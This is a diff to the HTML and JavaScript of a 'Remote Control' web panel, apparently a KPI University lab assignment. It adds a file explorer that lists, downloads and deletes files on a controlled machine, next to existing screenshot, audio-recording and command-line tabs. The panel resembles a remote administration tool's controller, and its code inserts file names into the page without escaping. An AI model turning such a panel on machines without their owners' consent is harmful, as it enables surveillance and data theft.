@@ -2,8 +2,8 @@
 <html>
 <head>
     <title>Remote Control</title>
-    <link rel="stylesheet" type="text/css" href="sup.css"/>
-    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="stylesheet" type="text/css" href="web/sup.css"/>
+    <link rel="icon" type="image/x-icon" href="web/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
     <style>
@@ -71,7 +71,7 @@
             background-color: crimson;
             color: white;
             border: none;
-            padding: 15px 20px;
+            padding: 8px;
             font-size: 16px;
             cursor: pointer;
             transition: background-color 0.3s;
@@ -174,11 +174,55 @@
         .terminal input[type="text"]:focus {
             outline: none;
         }
+        #fileExplorer {
+            border: 1px solid #ccc;
+            padding: 10px;
+            /* max-width: 1000px; */
+            margin: auto;
+            overflow-y: auto;
+            background-color: #000;
+        }
+        #path {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .item {
+            padding: 5px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+        }
+        .item:hover {
+            background-color: #ffff002c;
+        }
+        .directory {
+            color: #00ffff;
+            font-weight: bold;
+        }
+        .file {
+            color: #00ff00;
+        }
+        button {
+            margin: 5px 0;
+        }
+        .item .name {
+    flex: 4; /* Larger width for name */
+}
+
+.item .size {
+    flex: 1; /* Medium width for size */
+    text-align: left;
+}
+
+.item .created {
+    flex: 1.5; /* Medium width for created date */
+    text-align: left;
+}
     </style>
 </head>
 <body>
     <div class="topnav">
-        <img class="logo" src="favicon.ico" alt="Logo">
+        <img class="logo" src="web/favicon.ico" alt="Logo">
         <a href="index.php">Adverts</a>
         <a href="upd-form.php">+Advert</a>
         <a href="admin.php">Admin</a>
@@ -188,8 +232,8 @@
 
     <div class="content">
         <div class="sidebar">
-            <button id="sysinfoButton" onclick="openTab('sysinfo', this)">System information</button>
-            <button onclick="openTab('transfer', this)">Transfer file</button>
+            <button id="sysinfoButton" onclick="openTab('sysinfo', this)">System Information</button>
+            <button onclick="openTab('fileExplorer', this)">File Explorer</button>
             <button onclick="openTab('screenshot', this)">Make Screenshot</button>
             <button onclick="openTab('audio', this)">Record Audio</button>
             <button onclick="openTab('cmd', this)">Command line</button>
@@ -208,9 +252,11 @@
                     <!-- System info will be populated here -->
                 </div>
             </div>
-            <div id="transfer" class="tab-content">
-                <h2>Transfer File</h2>
-                <p>This tab is for transferring files.</p>
+            <div id="fileExplorer" class="tab-content">
+                <div id="path">Current Path: /</div>
+                <div id="content"></div>
+                <button class="screenshot-button" onclick="goBack()">Go Back</button>
+                <input type="file" id="fileUpload" style="display:none;" onchange="uploadFile(this.files[0])">
             </div>
             <div id="screenshot" class="tab-content">
                 <button class="screenshot-button" onclick="takeScreenshot()">Take Screenshot</button>
@@ -261,10 +307,12 @@
     </div>
 
     <div class="bottpanel">
-        <h2>Web | Lab №5 | <a href="https://kpi.ua/" style="color: crimson;">KPI University</a></h2>
+        <h2>kpi_re | Lab №4 | <a href="https://kpi.ua/">KPI University</a></h2>
     </div>
 
     <script>
+        let currentPath = './';
+
         function openTab(tabId, button) {
             // Hide all tab content
             const contents = document.querySelectorAll('.tab-content');
@@ -281,8 +329,16 @@
             // Add active class to the current button
             button.classList.add('active');
             
-            if (tabId === 'sysinfo') {
-                fetchSystemInfo();
+            switch(tabId) {
+                case 'sysinfo':
+                    fetchSystemInfo();
+                    break;
+                case 'fileExplorer':
+                    fetchFolderContents(currentPath);
+                    break;
+                case 'screenshot':
+                    takeScreenshot();
+                    break;
             }
         }
 
@@ -436,6 +492,116 @@
             }
         });
 
+        async function fetchFolderContents(dir) {
+            try {
+                const response = await fetch('/do', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'dir_list', dir })
+                });
+                const data = await response.json();
+                displayContents(data);
+            } catch (error) {
+                console.error('Error fetching folder contents:', error);
+            }
+        }
+
+        function displayContents(data) {
+        const contentDiv = document.getElementById('content');
+        contentDiv.innerHTML = '';
+        document.getElementById('path').innerText = `Current Path: ${currentPath}`;
+
+        data.dirs.forEach(dir => {
+            const dirDiv = document.createElement('div');
+            dirDiv.className = 'item directory';
+            dirDiv.innerText = dir.name;
+            dirDiv.onclick = () => openDirectory(dir.name);
+            contentDiv.appendChild(dirDiv);
+        });
+
+        data.files.forEach(file => {
+            const fileDiv = document.createElement('div');
+            fileDiv.className = 'item file';
+            fileDiv.innerHTML = `
+            <span class="name">${file.name}</span>
+            <span class="size">${formatFileSize(file.size)}</span>
+            <span class="created">${file.create_date}</span>
+                <span>
+                    <button class="screenshot-button" onclick="downloadFile('${file.name}')">📥</button>
+                    <button class="screenshot-button" onclick="deleteFile('${file.name}')">🗑️</button>
+                </span>`;
+            contentDiv.appendChild(fileDiv);
+        });
+    }
+
+    function formatFileSize(bytes) {
+        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+        if (bytes === 0) return '0 Bytes';
+        const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)), 10);
+        return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${sizes[i]}`;
+    }
+
+        function openDirectory(dirName) {
+            currentPath += `${dirName}/`;
+            fetchFolderContents(currentPath);
+        }
+
+        function goBack() {
+            if (currentPath !== '/') {
+                currentPath = currentPath.split('/').slice(0, -2).join('/') + '/';
+                fetchFolderContents(currentPath);
+            }
+        }
+
+        async function downloadFile(fileName) {
+            try {
+
+                fetch('/do', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ action: 'save_file', path: currentPath + fileName})
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'OK') {
+                        // window.location.href = data.url;
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = data.url; // URL from the response (e.g., '/artifacts/andr.crt')
+                        downloadLink.download = data.url.split('/').pop(); // Extract file name from the URL for the download
+                        document.body.appendChild(downloadLink);
+                        downloadLink.click();
+                        document.body.removeChild(downloadLink);
+                    }
+                });
+            } catch (error) {
+                console.error('Error downloading file:', error);
+            }
+        }
+
+        async function deleteFile(fileName) {
+            if (confirm(`Delete file: ${fileName}?`)) {
+                try {
+                    await fetch('/do', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ action: 'del_file', path: currentPath + fileName })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert(`Status action: ${data.status}`);
+                    });
+                    fetchFolderContents(currentPath);
+                } catch (error) {
+                    console.error('Error deleting file:', error);
+                }
+            }
+
+        }
+
+        // Initialize by loading root directory
+        //fetchFolderContents(currentPath);
     </script>
 </body>
 </html>
